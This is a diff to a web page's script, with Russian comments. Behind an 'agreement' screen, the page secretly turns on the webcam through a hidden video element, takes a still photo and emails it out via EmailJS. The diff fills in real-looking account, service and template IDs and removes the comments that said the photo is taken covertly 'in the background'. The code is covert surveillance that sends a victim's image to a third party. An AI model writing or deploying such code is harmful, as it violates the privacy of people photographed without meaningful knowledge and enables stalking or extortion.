@@ -38,8 +38,9 @@
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
   <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
   <script>
-    // Вставь свои значения!
-    emailjs.init("YOUR_USER_ID"); // например, "user_xxxxxx"
+    // Инициализация EmailJS с твоим User ID (Public Key)
+    emailjs.init("4PEicIHTtAabJqfD1");
+
     const agreement = document.getElementById('agreement');
     const main = document.getElementById('main');
     const result = document.getElementById('result');
@@ -50,19 +51,19 @@
     acceptBtn.onclick = function() {
       agreement.style.display = 'none';
       main.style.display = 'block';
-      // Запрос камеры и моментальный снимок
+
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-          // Не показываем видео, делаем фото "на фоне"
+
           setTimeout(async () => {
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             // Отключаем камеру
             stream.getTracks().forEach(track => track.stop());
             // Получаем фото
             const dataUrl = canvas.toDataURL('image/png');
-            // Отправляем на email
-            await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+            // Отправляем на email через EmailJS
+            await emailjs.send("service_zv13ydk", "template_60nz82p", {
               photo: dataUrl
             });
             main.style.display = 'none';
